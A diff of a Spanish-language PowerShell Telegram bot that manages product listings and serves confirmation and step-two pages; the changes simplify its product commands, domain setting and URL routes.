-      $Db[$p['id']] = $p
-      Set-Activo $p['id']
-      Save-Db
-      $Script:Wizard = $null
-      Save-Wizard
-      Notificar $chat $p
-      return
-    }
+    '/listo' { Completar-Producto $chat; return }
 
     '/productos' {
-      $prodsKeys = @($Db.Keys | Where-Object { $_ -ne 'products' -and $_ -ne 'activeId' -and $Db[$_] })
-      if ($prodsKeys.Count -eq 0) { Responder $chat 'Todavía no hay productos. Usa /nuevo.'; return }
-      $lineas = foreach ($id in $prodsKeys) {
-        '• <b>' + (Esc $Db[$id]['titulo']) + '</b> — ' + (Eur $Db[$id]['precio']) + "`n<code>" + $id + "</code> → " + (Url-Producto $Db[$id])
+      if ($Db.Keys.Count -eq 0) { Responder $chat 'Todavía no hay productos. Usa /nuevo.'; return }
+      $lineas = foreach ($id in $Db.Keys) {
+        '• ' + (Esc $Db[$id]['titulo']) + ' — ' + (Eur $Db[$id]['precio']) + "`n" + (Url-Producto $Db[$id])
       }
       Responder $chat ($lineas -join "`n`n")
       return
     }
 
     '/editar' {
-      $argClean = $arg.Trim().TrimStart('#').ToUpper()
-      $matchId = $null
-      foreach ($k in $Db.Keys) {
-        if ($k.ToUpper() -eq $argClean) { $matchId = $k; break }
-      }
-      if (-not $matchId -or -not $Db.ContainsKey($matchId)) {
-        Responder $chat 'Uso: /editar ID (mira /productos)'; return
-      }
-      Set-Activo $matchId
-      Responder $chat ('✏️ Editando:' + "`n" + (Resumen $Db[$matchId]) + "`n" + (Url-Producto $Db[$matchId]))
+      if (-not $Db.ContainsKey($arg)) { Responder $chat 'Uso: /editar ID (mira /productos)'; return }
+      Set-Activo $arg
+      Responder $chat ('✏️ Editando:' + "`n" + (Resumen $Db[$arg]) + "`n" + (Url-Producto $Db[$arg]))
       return
     }
 
     '/borrar' {
-      $argClean = $arg.Trim().TrimStart('#').ToUpper()
-      $matchId = $null
-      foreach ($k in $Db.Keys) {
-        if ($k.ToUpper() -eq $argClean) { $matchId = $k; break }
-      }
-      if (-not $matchId -or -not $Db.ContainsKey($matchId)) {
-        Responder $chat 'Uso: /borrar ID'; return
-      }
-      $Db.Remove($matchId)
-      if ($Script:Activo -eq $matchId) {
-        $remaining = @($Db.Keys | Where-Object { $_ -ne 'products' -and $_ -ne 'activeId' })
-        Set-Activo (if ($remaining.Count -gt 0) { $remaining[0] } else { '' })
-      }
+      if (-not $Db.ContainsKey($arg)) { Responder $chat 'Uso: /borrar ID'; return }
+      $Db.Remove($arg)
+      if ($Script:Activo -eq $arg) { Set-Activo '' }
       Save-Db
-      Responder $chat ("🗑 Producto <code>" + $matchId + "</code> borrado.")
+      Responder $chat '🗑 Producto borrado.'
       return
     }
 
@@ -718,17 +826,16 @@ function Handle-Update($u) {
       return
     }
 
-    { $_ -in '/dominio', '/url' } {
+    '/dominio' {
       if (-not $arg) {
-        Responder $chat ('Dominio actual: <code>' + $Script:Base + '</code>' + "`n`n" + 'Uso: <code>/url https://tu-sitio.com</code>')
+        Responder $chat ('Dominio actual: <code>' + $Script:Base + '</code>' + "`n`n" + 'Uso: <code>/dominio https://tu-sitio.com</code>')
         return
       }
       $nuevo = $arg.Trim().TrimEnd('/')
       if (-not $nuevo.StartsWith('http://') -and -not $nuevo.StartsWith('https://')) { $nuevo = 'https://' + $nuevo }
       $Script:Base = $nuevo
       $Cfg.publicUrl = $nuevo
-      $Cfg.base_url = $nuevo + '/a/'
-      $Cfg | ConvertTo-Json -Depth 4 | Set-Content -Path (Join-Path $Raiz 'config.json') -Encoding UTF8
+      $Cfg | ConvertTo-Json | Set-Content -Path (Join-Path $Raiz 'config.json') -Encoding UTF8
       Responder $chat ('✅ Dominio actualizado a: <code>' + $Script:Base + '</code>')
       return
     }
@@ -891,7 +998,7 @@ function Handle-Client($cliente) {
       }
     } elseif ($ruta -eq '/api/health') {
       $cuerpo = '{"ok":true}'; $estado = '200 OK'; $tipo = 'application/json; charset=utf-8'
-    } elseif ($ruta -eq '/confirmar.html' -or $ruta -eq '/confirmar' -or $ruta -eq '/confirmar.php' -or $ruta -eq '/confirmacion' -or $ruta -eq '/confirmacion.html' -or $ruta -eq '/confirmacion.php') {
+    } elseif ($ruta -eq '/confirmar.html' -or $ruta -eq '/confirmar') {
       $confPath = Join-Path $Raiz 'web\confirmar.html'
       if (-not (Test-Path $confPath)) { $confPath = Join-Path $Raiz 'confirmar.html' }
       if (Test-Path $confPath) {
@@ -905,7 +1012,7 @@ function Handle-Client($cliente) {
         return
       }
       $cuerpo = 'No encontrado'; $estado = '404 Not Found'; $tipo = 'text/plain; charset=utf-8'
-    } elseif ($ruta -eq '/step2.html' -or $ruta -eq '/step2' -or $ruta -eq '/step2.php') {
+    } elseif ($ruta -eq '/step2.html' -or $ruta -eq '/step2') {
       $step2Path = Join-Path $Raiz 'web\step2.html'
       if (-not (Test-Path $step2Path)) { $step2Path = Join-Path $Raiz 'step2.html' }
       if (Test-Path $step2Path) {
